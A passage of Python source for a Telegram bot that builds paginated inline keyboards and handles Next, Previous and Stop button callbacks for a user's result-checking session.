        row.append(InlineKeyboardButton(text="Next ▶", callback_data=f"stco_next_{msg_id}"))
    if row:
        buttons.append(row)

    running = state.get("final_status") == "checking" and not state.get("stopped")
    if running:
        buttons.append([
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"stco_stop_{msg_id}",
                style="danger",
                icon_custom_emoji_id=EMOJI_STOP,
            )
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons) if buttons else None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PAGINATION CALLBACK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(F.data.startswith("stco_"))
async def stco_callback_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = STCO_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action      = parts[1]
    total_pages = (len(state["results"]) + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "stop":
        state["stopped"] = True
        for t in state.get("tasks", []):
            if not t.done():
                t.cancel()
        await callback.answer("🛑 Stopping…", show_alert=False)
        return

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    await callback.answer()

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))
    text    = format_page_content(state, elapsed, is_working=False)

    try:
        await callback.message.edit_text(text, parse_mode="HTML",
                                         reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass
